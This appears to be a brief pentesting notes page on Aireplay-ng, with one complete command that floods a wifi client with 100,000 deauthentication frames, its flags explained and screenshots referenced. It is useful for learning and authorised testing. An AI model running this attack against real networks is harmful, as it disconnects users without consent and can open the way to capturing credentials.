---
description: >-
  a utility to perform attacks such as de-authenticating connected users from a
  wifi network.
---

# Aireplay-ng

Aireplay-ng works when Airodump-ng is scanning. ie; Airodump--ng must be scanning live before the Aireplay-ng utility will work.

`aireplay-ng --deauth 100000 -a 98:A9:42:27:A2:CA -c 38:B1:DB:EE:21:39 wlan0mon`  the `--deauth 100000` sends 100000 deauthentication messages to the client, `-a` denotes the Router/AP mac address, `-c` denotes client mac address.

<figure><img src="../.gitbook/assets/Screenshot from 2023-03-20 15-52-55.png" alt=""><figcaption><p><code>airodump-ng</code></p></figcaption></figure>

<figure><img src="../.gitbook/assets/Screenshot from 2023-03-20 15-52-34.png" alt=""><figcaption><p><code>aireplay-ng</code></p></figcaption></figure>
